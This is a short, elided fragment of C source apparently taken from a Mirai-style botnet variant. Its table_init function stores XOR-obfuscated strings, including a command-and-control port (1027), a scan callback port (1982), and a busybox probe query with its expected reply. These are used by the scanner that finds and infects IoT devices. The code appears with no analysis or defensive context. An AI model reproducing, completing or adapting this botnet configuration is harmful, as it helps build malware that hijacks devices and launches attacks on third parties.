...
void table_init(void)
{
    ...
    add_entry(TABLE_CNC_PORT, "\x50\x57", 2); //1027
    add_entry(TABLE_SCAN_CB_PORT, "\x53\xEA", 2); //1982
    ...
    add_entry(TABLE_SCAN_QUERY, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x17\x21\x38\x20\x54", 18);
    add_entry(TABLE_SCAN_RESP, "\x1E\x1B\x07\x1C\x1B\x6E\x74\x35\x24\x24\x38\x31\x20\x74\x3A\x3B\x20\x74\x32\x3B\x21\x3A\x30\x54", 24);
